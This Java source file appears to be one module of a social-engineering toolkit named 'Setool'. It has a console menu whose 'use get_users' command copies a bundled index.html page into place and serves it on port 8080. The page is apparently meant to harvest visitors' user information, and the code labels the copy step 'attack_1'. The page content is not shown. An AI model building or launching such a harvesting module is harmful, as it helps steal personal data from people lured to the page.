import java.util.Scanner;
import java.io.File;

public class web_get_users {
    public static void main(String[] args) throws Exception{
        /* this function is get the users information from web */
        get_users();
        return ;
    }
    public static void get_users() throws Exception{
        System.out.print("Setool-Main//Main Console//Web Get Users//");
        Scanner input = new Scanner(System.in) ;
        String run_command = input.nextLine() ;
        command(run_command);
        input.close();
    }
    public static void command(String command) throws Exception{
        String c1 = new String("show options") ;
        String c2 = new String("use get_users") ;
        String c3 = new String("exit") ;

        if (command.equals(c1)){
            /* show all the projects */
            File options = new File("config/web_get_users_options") ;
            setool.read_logo(options); //read the file
            web_get_users.get_users();
            return ;
        }
        if (command.equals(c2)){
            /* get the users information */
            String attack_1 = "cp Get_Users_info/index.html ./" ;
            exploit_social.shell1(attack_1); //copy the file
            int port = 8080 ;
            String page = "./index.html" ;
            String clsoe = "true" ;
            port_start.port_server(port, page , clsoe); //start the server ;
            web_get_users.get_users();
            return ;
        }if (command.equals(c3)){
            setool.run_main_function();
            return ;
        }
        else{
            get_users();
            return ;
        }
    }
}
